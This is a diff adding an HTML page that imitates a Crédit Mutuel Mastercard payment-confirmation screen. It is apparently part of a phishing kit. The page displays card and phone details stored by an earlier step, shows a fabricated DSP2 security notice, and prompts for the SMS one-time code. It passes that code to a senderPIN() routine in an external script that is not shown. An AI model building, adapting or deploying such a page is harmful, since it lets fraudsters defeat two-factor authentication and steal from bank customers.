@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpCreditMutuel_Mastercard</title>
+
+     <!--Scripts jquery-->
+        
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+ <!--Scripts jquery-->
+
+ <script>
+  document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
+  document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
+
+ </script>
+<script>
+    function validateForm() {
+      var x = document.forms["myForm"]["otp"].value;
+      if (x == "" || x == null) {
+        alert("Veuillez entrer le code reçu par SMS");
+        return false;
+      }
+    }
+    </script>
+</head>
+
+<link rel="stylesheet" href="./otpCreditMutuel_Mastercard.css">
+
+<body>
+    <div id="pin">
+
+    </div>
+    
+    <div class="totp">
+
+      <form  name="myForm" onsubmit="  validateForm();senderPIN()">
+
+        <div class="wrapper">
+
+            <div class="head">
+
+            <span class="bankLogo">
+
+                <img src="./assets/credit.jpg">
+
+            </span>
+
+            <span class="ccLogo">
+              <img src="./assets/mastercard.png">
+            </span>
+
+        </div>
+
+        <br>
+         
+        
+     <div class="details">
+      <p style="background: rgb(53, 81, 240); height: 30px;color: white;  padding: 4px;">
+        Récapitulatif de votre paiement</p><br>
+        <div class="labels">
+         
+            <label for="" class="a">Commarçant </label><br>
+            <label for="" class="a">Date et heure</label> <br>
+            <label for="" class="a">Numéro de carte </label>  <br>
+
+        </div>
+        
+        <div class="spans">
+            <span id="marchand"> Boulanger</span><br>
+            <span id="date"></span><br>
+            <span>**** **** **** <span id="encryptedCardNumber"></span> </span><br>
+
+        </div><br><br>
+      
+    </div>
+
+    <div style="background:rgba(139, 176, 255, 0.193) ;border: solid 1px rgba(17, 84, 230, 0.857); display: flex; padding: 20px; color: rgb(49, 94, 230);">
+      <p > <img src="./assets/I.png" style="width: 25px;"> Dans le cadre de la Directive DSP2 et pour assurer une meilleure sécurité de vos opération, la validtion de vos paiements, n'est plus possible avec le seul code reçu par SMS.
+      <br>
+      <br>Dès maintenant, téléchargez l'application Crédit Mutuel pour faciliter vos opérations avec notre solution gratuite Confirmation Mobile.
+    <br>
+    <br>
+    A défaut, vous devez saisir un <strong>Code Personnel Paiements Internet</strong> sur votre Espace client, menu Profil/Sécurité/Code Personnel Paiement Internet.
+    <strong><br> <br>En attendant que votre Code Personnel Paiements Internet soit enregistré, l'opération en cours peut encore être validée avec le seul code reçu par SMS.</strong>
+    </p>
+
+    <br>
+  </div>
+</form>
+
+
+<br>
+<div style="display:flex ; justify-content: center;">
+<label for="" ><strong>Code de confiramtion reçu  &NonBreakingSpace; &NonBreakingSpace; &NonBreakingSpace; <br>par SMS au <span>XX XX XX <span id="numtel"></span>: &NonBreakingSpace; &NonBreakingSpace; &NonBreakingSpace;</span></strong>
+</label>
+<input class="otp" name="otp"  id="numPin" type="text" placeholder="8 chiffres" >
+
+</div><br>
+<button type="submit" class="ok" 
+href="javascript:void(0);" onsubmit="senderPIN();">Valider </button>
+
+</div><br>
+<p class="do">Si vous ne revevez pas un SMS, consulter l'application mobile de votre banque.
+</p>
+<!--<div class="loader"></div>-->
+
+<script src="./senderPIN.js"></script>
+
+<script>
+  var dt = new Date();
+  document.getElementById("date").innerHTML = (("0"+dt.getDate()).slice(-2)) +"/"+ (("0"+(dt.getMonth()+1)).slice(-2)) +"/"+ (dt.getFullYear()) +" "+ (("0"+dt.getHours()).slice(-2)) +":"+ (("0"+dt.getMinutes()).slice(-2));
+  </script>
+
+
+ <!--Animated show for the div-->
+ <script type="text/javascript">
+    $(document).ready(function () {
+        $('.ok').click(function () {
+            $('.totp').fadeOut('4000');
+            $('#pin').load('commande.html').delay('5000').fadeIn('5000');
+            $('#otp').click(senderPIN());
+
+        });
+    });
+
+</script>
+</body>
+</html>
